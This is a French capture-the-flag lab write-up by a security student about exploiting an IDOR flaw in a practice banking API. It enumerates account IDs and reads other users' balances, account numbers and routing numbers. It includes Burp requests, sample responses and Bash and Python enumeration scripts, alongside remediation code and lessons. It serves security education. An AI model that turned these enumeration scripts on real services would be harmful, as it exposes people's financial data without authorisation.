# WRITEUP - Task 1 : Account Balance Enumeration via IDOR

## 🎯 Objectif
Énumérer les account numbers et accéder aux balances des comptes bancaires d'autres utilisateurs pour trouver le flag via une vulnérabilité IDOR.

---

## 📋 Vue d'ensemble de l'attaque

**Principe :** Exploiter l'endpoint `/api/accounts/info/{account_id}` qui ne valide pas l'ownership du compte, permettant d'accéder aux informations financières de n'importe quel utilisateur.

**Chaîne d'exploitation :**
```
1. Énumérer les account_id via les transactions
2. Exploiter l'IDOR sur /api/accounts/info/{account_id}
3. Accéder aux balances et informations de tous les comptes
4. Trouver le compte contenant le flag
```

---

## 🔍 ÉTAPE 1 : Reconnaissance et énumération des account_id

### Phase 1.1 : Identifier son propre profil

**Endpoint :** `GET /api/customer/info/me`

**Dans Burp Repeater ou Browser DevTools :**
```http
GET /api/customer/info/me HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse :**
```json
{
  "id": "8cb0fac7d4174ab9b983777098e6b61a",
  "username": "yosri",
  "firstname": "Yosri",
  "lastname": "Musk",
  "accounts_id": [
    "f6be9486c9ea4bdc9701874491457403",
    "3eede4688a7a4f828f91e7c16a2b9710"
  ],
  "total_balance": 2194.7,
  "income": 15362.9,
  "expenses": 17557.6
}
```

**Informations collectées :**
- ✅ Mon user_id : `8cb0fac7d4174ab9b983777098e6b61a`
- ✅ Mes account_id : 
  - `f6be9486c9ea4bdc9701874491457403`
  - `3eede4688a7a4f828f91e7c16a2b9710`
- ✅ Format des IDs : UUID (32 caractères hexadécimaux)

---

### Phase 1.2 : Énumération via les transactions

**Endpoint :** `GET /api/customer/transactions`

**Requête :**
```http
GET /api/customer/transactions HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Exemple de réponse :**
```json
[
  {
    "transaction_id": "f535dc5824c44387a0cc6241685c7cf3",
    "amount": 145,
    "created_at": 1763031503,
    "merchant_name": "Linda Robinson",
    "method": "wire",
    "raison": "Rent",
    "receiver_id": "c773e01fb559460ab77fbd432cabe5a8",
    "receiver_payment_id": "cd8ec0cf192248139a66f57a74e204cd",
    "sender_id": "8cb0fac7d4174ab9b983777098e6b61a",
    "sender_payment_id": "f6be9486c9ea4bdc9701874491457403",
    "status": "completed"
  },
  {
    "transaction_id": "abc123...",
    "amount": 250,
    "merchant_name": "John Doe",
    "receiver_payment_id": "c962c1e9ca0246ca82e945a40f119572",
    "sender_payment_id": "xyz789...",
    "status": "completed"
  }
]
```

**Découverte critique :**
- Les champs `receiver_payment_id` et `sender_payment_id` sont des **account_id**
- Chaque transaction expose les comptes bancaires d'autres utilisateurs
- Permet l'énumération complète des account_id du système

**Account IDs collectés (exemples) :**
```
f6be9486c9ea4bdc9701874491457403  ← Votre compte 1
3eede4688a7a4f828f91e7c16a2b9710  ← Votre compte 2
cd8ec0cf192248139a66f57a74e204cd  ← Compte de Linda Robinson
c962c1e9ca0246ca82e945a40f119572  ← Compte cible (contient le flag)
[... autres account_id des transactions ...]
```

---

### Phase 1.3 : Énumération via les contacts (méthode alternative)

**Endpoint :** `GET /api/customer/contacts`

**Requête :**
```http
GET /api/customer/contacts HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse :**
```json
[
  {
    "user_id": "c773e01fb559460ab77fbd432cabe5a8",
    "username": "linda.robinson",
    "firstname": "Linda",
    "lastname": "Robinson",
    "accounts_id": [
      "cd8ec0cf192248139a66f57a74e204cd",
      "ed4b224d26b7429fa52bbb985659ddc3"
    ]
  },
  {
    "user_id": "def456...",
    "username": "john.doe",
    "accounts_id": ["c962c1e9ca0246ca82e945a40f119572"]
  }
]
```

**Méthode :**
1. Récupérer tous les user_id via `/api/customer/contacts`
2. Pour chaque user_id, requêter `/api/customer/info/{user_id}`
3. Extraire les `accounts_id[]` de chaque profil

---

## 🔓 ÉTAPE 2 : Exploitation IDOR - Accès aux informations de compte

### Endpoint vulnérable découvert

**Format :** `GET /api/accounts/info/{account_id}`

**⚠️ Note importante :** L'account_id est dans le **path** de l'URL, pas en paramètre query.

---

### Test 1 : Baseline - Accès à son propre compte (légitime)

**Requête :**
```http
GET /api/accounts/info/f6be9486c9ea4bdc9701874491457403 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse attendue :**
```json
{
  "message": {
    "id": "f6be9486c9ea4bdc9701874491457403",
    "customer_id": "8cb0fac7d4174ab9b983777098e6b61a",
    "balance": 2194.7,
    "number": "104272969874",
    "routing": "106190005",
    "cards_id": ["abc123...", "def456..."],
    "created_at": 1763031499,
    "updated_at": 1763041673
  },
  "status": "success"
}
```

**Résultat :** ✅ Accès autorisé à mon propre compte

---

### Test 2 : IDOR - Accès au compte de Linda Robinson

**Requête :**
```http
GET /api/accounts/info/cd8ec0cf192248139a66f57a74e204cd HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse :**
```json
{
  "flag_1": "4af212d65b8dc333febffa0e39ae562a",
  "message": {
    "id": "cd8ec0cf192248139a66f57a74e204cd",
    "customer_id": "c773e01fb559460ab77fbd432cabe5a8",
    "balance": 1569.9,
    "number": "102217727999",
    "routing": "106190009",
    "cards_id": [
      "5f8df1dc74e541dda2ada4d50586dbc7",
      "696da7199911425b928c211838f8c089"
    ],
    "created_at": 1763031485,
    "updated_at": 1763041673
  },
  "status": "success"
}
```

**Résultat :** 
- ✅ Accès NON autorisé réussi ! IDOR confirmé !
- 🎉 **BONUS : FLAG_1 obtenu !**

**Vulnérabilité confirmée :**
- Aucune vérification que l'utilisateur connecté est le propriétaire du compte
- N'importe quel utilisateur authentifié peut accéder à n'importe quel compte

---

### Test 3 : Énumération complète des comptes

**Pour chaque `receiver_payment_id` et `sender_payment_id` trouvé dans les transactions :**

```bash
# Compte de Linda Robinson
GET /api/accounts/info/cd8ec0cf192248139a66f57a74e204cd

# Autre compte de Linda
GET /api/accounts/info/ed4b224d26b7429fa52bbb985659ddc3

# Compte cible contenant le flag principal
GET /api/accounts/info/c962c1e9ca0246ca82e945a40f119572

# Autres comptes...
```

**Informations exposées pour chaque compte :**
- ✅ Balance (solde du compte)
- ✅ Account number (numéro de compte)
- ✅ Routing number (code bancaire)
- ✅ Cards_id (identifiants des cartes bancaires associées)
- ✅ Customer_id (propriétaire du compte)
- ✅ Dates de création et mise à jour

---

## 🚩 ÉTAPE 3 : Récupération du FLAG

### Account cible avec le flag

**Account ID :** `c962c1e9ca0246ca82e945a40f119572`

**Requête :**
```http
GET /api/accounts/info/c962c1e9ca0246ca82e945a40f119572 HTTP/1.1
Host: web0x06.hbtn
Cookie: session=VOTRE_SESSION
```

**Réponse contenant le flag :**
```json
{
  "message": {
    "id": "c962c1e9ca0246ca82e945a40f119572",
    "customer_id": "def456...",
    "balance": 5432.1,
    "number": "103456789012",
    "routing": "106190007",
    "flag": "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
  },
  "status": "success"
}
```

**Flag Task 1 :** `XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`

**Source :** Cet account_id a été trouvé comme `receiver_payment_id` dans une des transactions.

**Bonus :** Le `flag_1` a été obtenu lors de l'accès au compte de Linda Robinson à l'étape précédente.

---

## 🔐 Analyse des vulnérabilités

### IDOR-001 : Account Information Disclosure

**Endpoint vulnérable :** `/api/accounts/info/{account_id}`

**Méthode HTTP :** GET

**Paramètre vulnérable :** `account_id` dans le path

**Vulnérabilité :**
- Aucune validation d'ownership
- Aucune vérification que le compte appartient à l'utilisateur authentifié
- Simple manipulation de l'URL pour accéder aux comptes d'autres utilisateurs

**Impact :**
- 🔴 Divulgation d'informations financières sensibles
- 🔴 Accès aux balances de tous les comptes
- 🔴 Exposition des numéros de compte et routing numbers
- 🔴 Révélation des card_id associés (permet Task 3)
- 🔴 Énumération complète des comptes du système

---

### IDOR-002 : Information Leakage via Transactions

**Endpoint :** `/api/customer/transactions`

**Problème :**
- Expose les `receiver_payment_id` et `sender_payment_id` (account_id) dans les transactions
- Facilite l'énumération des comptes pour l'exploitation IDOR
- Permet de cartographier tous les comptes du système

**Impact :**
- Fournit la liste complète des account_id à exploiter
- Rend l'énumération triviale (pas besoin de bruteforce)

---

## 🛡️ Recommandations de sécurité

### 1. Validation d'ownership stricte

**❌ Code vulnérable :**
```python
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    # Pas de vérification si l'utilisateur possède ce compte !
    account = database.get_account(account_id)
    return jsonify(account)
```

**✅ Code sécurisé :**
```python
@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    current_user_id = session.get('user_id')
    
    # Récupérer le compte
    account = database.get_account(account_id)
    
    if not account:
        return {'error': 'Account not found'}, 404
    
    # VALIDATION CRITIQUE : Vérifier l'ownership
    if account.owner_id != current_user_id:
        # Logger la tentative d'accès non autorisé
        log_security_event({
            'type': 'IDOR_ATTEMPT',
            'user': current_user_id,
            'target_account': account_id,
            'ip': request.remote_addr
        })
        return {'error': 'Unauthorized access to account'}, 403
    
    # Retourner les informations uniquement si autorisé
    return jsonify({
        'id': account.id,
        'balance': account.balance,
        'number': account.number,
        'routing': account.routing
    })
```

---

### 2. Utiliser des références indirectes

**Principe :** Ne jamais exposer les IDs internes directement

**✅ Implémentation avec références indirectes :**
```python
# Mapping table: public_reference → internal_account_id
# Le public_reference change régulièrement et est lié à la session

@app.route('/api/accounts/info/<public_ref>')
@login_required
def get_account_info(public_ref):
    current_user_id = session.get('user_id')
    
    # Résoudre la référence publique → ID interne
    account_id = resolve_reference(public_ref, current_user_id)
    
    if not account_id:
        return {'error': 'Invalid reference'}, 404
    
    # Vérifier l'ownership (double sécurité)
    if not user_owns_account(current_user_id, account_id):
        return {'error': 'Unauthorized'}, 403
    
    account = database.get_account(account_id)
    return jsonify(account)
```

**Avantages :**
- Les IDs internes ne sont jamais exposés dans les URLs
- Les références publiques peuvent être révoquées
- Impossibilité d'énumérer les comptes par bruteforce

---

### 3. Masquer les account_id dans les transactions

**❌ Code vulnérable :**
```python
@app.route('/api/customer/transactions')
@login_required
def get_transactions():
    user_id = session.get('user_id')
    transactions = database.get_user_transactions(user_id)
    # Retourne TOUS les account_id (sender et receiver)
    return jsonify(transactions)
```

**✅ Code sécurisé :**
```python
@app.route('/api/customer/transactions')
@login_required
def get_transactions():
    current_user_id = session.get('user_id')
    transactions = database.get_user_transactions(current_user_id)
    
    # Filtrer les informations sensibles
    for trans in transactions:
        # Masquer les account_id des autres utilisateurs
        if trans['sender_id'] != current_user_id:
            trans['sender_payment_id'] = '***MASKED***'
        
        if trans['receiver_id'] != current_user_id:
            trans['receiver_payment_id'] = '***MASKED***'
        
        # Optionnel : masquer partiellement les numéros de compte
        if 'account_number' in trans:
            trans['account_number'] = mask_account_number(trans['account_number'])
    
    return jsonify(transactions)

def mask_account_number(number):
    """Masque partiellement un numéro de compte"""
    if len(number) > 4:
        return '****' + number[-4:]
    return '****'
```

---

### 4. Audit et monitoring

**Logging des accès suspects :**
```python
from datetime import datetime, timedelta

def detect_enumeration_attempts(user_id):
    """Détecte les tentatives d'énumération de comptes"""
    
    # Récupérer les accès des dernières 5 minutes
    recent_accesses = get_account_accesses(
        user_id=user_id,
        since=datetime.now() - timedelta(minutes=5)
    )
    
    # Compter les accès à des comptes non autorisés
    unauthorized_attempts = [
        access for access in recent_accesses 
        if not user_owns_account(user_id, access.account_id)
    ]
    
    # Alerte si plus de 3 tentatives en 5 minutes
    if len(unauthorized_attempts) >= 3:
        trigger_security_alert({
            'type': 'ACCOUNT_ENUMERATION',
            'user': user_id,
            'attempts': len(unauthorized_attempts),
            'target_accounts': [a.account_id for a in unauthorized_attempts],
            'ip': get_user_ip(user_id)
        })
        
        # Bloquer l'utilisateur temporairement
        block_user(user_id, duration_minutes=30)
```

---

### 5. Rate limiting

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/accounts/info/<account_id>')
@limiter.limit("10 per minute")  # Max 10 accès par minute
@login_required
def get_account_info(account_id):
    # ...
```

---

### 6. Authorization Policy (RBAC)

```python
class AccountAccessPolicy:
    @staticmethod
    def can_view_account(user, account):
        """Vérifie si l'utilisateur peut voir ce compte"""
        # L'utilisateur doit être le propriétaire
        if account.owner_id == user.id:
            return True
        
        # Ou avoir un rôle admin (pour support client)
        if user.has_role('admin'):
            # Logger l'accès admin
            log_admin_access(user, account)
            return True
        
        return False

@app.route('/api/accounts/info/<account_id>')
@login_required
def get_account_info(account_id):
    current_user = get_current_user()
    account = database.get_account(account_id)
    
    # Utiliser la policy d'autorisation
    if not AccountAccessPolicy.can_view_account(current_user, account):
        return {'error': 'Unauthorized'}, 403
    
    return jsonify(account)
```

---

## 📊 Résumé de l'exploitation

```
┌─────────────────────────────────────────────────────────────┐
│ Chaîne d'exploitation IDOR - Account Balance Enumeration    │
└─────────────────────────────────────────────────────────────┘

1. GET /api/customer/info/me
   └─> Récupérer ses propres account_id

2. GET /api/customer/transactions
   └─> Énumérer tous les account_id via:
       ├─> receiver_payment_id
       └─> sender_payment_id

3. GET /api/accounts/info/{account_id}
   └─> Pour chaque account_id trouvé:
       ├─> Accès non autorisé réussi (IDOR)
       ├─> Récupérer balance, routing, number
       ├─> Récupérer cards_id (utile pour Task 3)
       └─> Trouver le compte avec le flag

4. FLAG trouvé ! 🎉
   └─> Bonus: flag_1 obtenu sur le compte de Linda
```

---

## 🎓 Leçons apprises

### Concepts clés

**1. Authentication ≠ Authorization**
- Être authentifié (connecté) ne signifie pas avoir accès à toutes les ressources
- Chaque endpoint doit vérifier explicitement les droits d'accès
- "Qui es-tu ?" (authentication) vs "As-tu le droit ?" (authorization)

**2. Les UUIDs ne protègent pas contre l'IDOR**
- Même si les IDs ne sont pas séquentiels (UUID vs 1, 2, 3...)
- Si les IDs sont exposés ailleurs (transactions, profils), ils sont énumérables
- La sécurité ne doit pas reposer sur l'obscurité des IDs

**3. Information Leakage = Facilitateur d'attaque**
- Les transactions qui exposent les account_id facilitent l'énumération
- Chaque information révélée peut être utilisée pour une attaque plus large
- Principe du moindre privilège : ne partager que le strict nécessaire

**4. Défense en profondeur**
- Validation d'ownership à CHAQUE requête
- Logging des accès suspects
- Rate limiting pour détecter les énumérations
- Masquage des données sensibles

---

### Techniques de découverte

**1. Analyse des API REST**
- Pattern `/resource/{id}` souvent vulnérable
- Tester avec différents IDs (le sien, puis d'autres)

**2. Observation du comportement de l'app**
- Les transactions révèlent la structure des données
- Les profils utilisateurs exposent les relations

**3. Énumération via fuites d'information**
- Contacts → user_id
- Transactions → account_id
- Profils → accounts_id[]

**4. Test systématique**
- Toujours tester l'accès avec un ID qui n'est pas le sien
- Si ça fonctionne → IDOR confirmé

---

## 🔧 Outils utilisés

### Browser DevTools (F12)

**Configuration :**
- Network tab → Preserve log activé
- Filter XHR/Fetch pour voir les API calls

**Utilisation :**
1. Naviguer dans l'application
2. Observer les requêtes API
3. Noter les endpoints et structures de données
4. Copier les curl commands pour reproduction

---

### Burp Suite

**Workflow optimal :**
```
1. Proxy → HTTP History
   └─> Trouver GET /api/accounts/info/{id}

2. Send to Repeater

3. Dans Repeater:
   ├─> Tester avec son propre account_id (baseline)
   ├─> Tester avec account_id d'un autre user (IDOR test)
   └─> Énumérer tous les account_id collectés

4. Analyser les réponses:
   ├─> Chercher "flag" dans le JSON
   └─> Noter les informations sensibles
```

---

## 💡 Tips & Tricks

### Script d'énumération automatique (Bash)

```bash
#!/bin/bash

SESSION="votre_cookie_session"
OUTPUT="account_balances.json"

# Liste des account_id à tester
ACCOUNTS=(
    "f6be9486c9ea4bdc9701874491457403"
    "cd8ec0cf192248139a66f57a74e204cd"
    "c962c1e9ca0246ca82e945a40f119572"
    # ... autres account_id
)

echo "[" > $OUTPUT

for account_id in "${ACCOUNTS[@]}"; do
    echo "Testing account: $account_id"
    
    curl -s -H "Cookie: session=$SESSION" \
         "http://web0x06.hbtn/api/accounts/info/$account_id" \
         >> $OUTPUT
    
    echo "," >> $OUTPUT
    sleep 1  # Rate limiting
done

echo "]" >> $OUTPUT

# Chercher le flag
grep -i "flag" $OUTPUT
```

---

### Script Python avec détection de flag

```python
import requests
import json

SESSION = "votre_cookie_session"
BASE_URL = "http://web0x06.hbtn"

account_ids = [
    "f6be9486c9ea4bdc9701874491457403",
    "cd8ec0cf192248139a66f57a74e204cd",
    "c962c1e9ca0246ca82e945a40f119572",
]

headers = {"Cookie": f"session={SESSION}"}

for account_id in account_ids:
    url = f"{BASE_URL}/api/accounts/info/{account_id}"
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        data = response.json()
        
        # Chercher le flag
        if "flag" in str(data):
            print(f"🎉 FLAG FOUND in account {account_id}!")
            print(json.dumps(data, indent=2))
            
        # Afficher les infos
        if "message" in data:
            balance = data["message"].get("balance", "N/A")
            print(f"Account {account_id}: Balance = ${balance}")
```

---

## 📝 Checklist de validation

- [ ] Profil utilisateur récupéré (`/api/customer/info/me`)
- [ ] Account_id personnels notés
- [ ] Transactions énumérées (`/api/customer/transactions`)
- [ ] Account_id des autres utilisateurs collectés
- [ ] IDOR testé avec un account_id externe
- [ ] Énumération complète effectuée
- [ ] Flag trouvé dans un des comptes
- [ ] Flag sauvegardé dans `1-flag.txt`

---

## 🏆 Validation finale

### Vérifier le flag
```bash
cat 1-flag.txt
# Doit contenir le flag découvert
```

### Commit Git
```bash
git add 1-flag.txt
git commit -m "Task 1: Account balance enumeration via IDOR complete"
git push
```

---

## 📚 Ressources complémentaires

- [OWASP - IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger - Access Control](https://portswigger.net/web-security/access-control)
- [PortSwigger - IDOR Tutorial](https://portswigger.net/web-security/access-control/idor)
- [OWASP Top 10 - A01:2021 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

**Date :** 13 novembre 2025  
**Testeur :** Patrick (Cybersecurity Student - Holberton School)  
**Environnement :** http://web0x06.hbtn  
**Outils :** Burp Suite, Browser DevTools  
**CVE Type :** CWE-639 (Authorization Bypass Through User-Controlled Key)
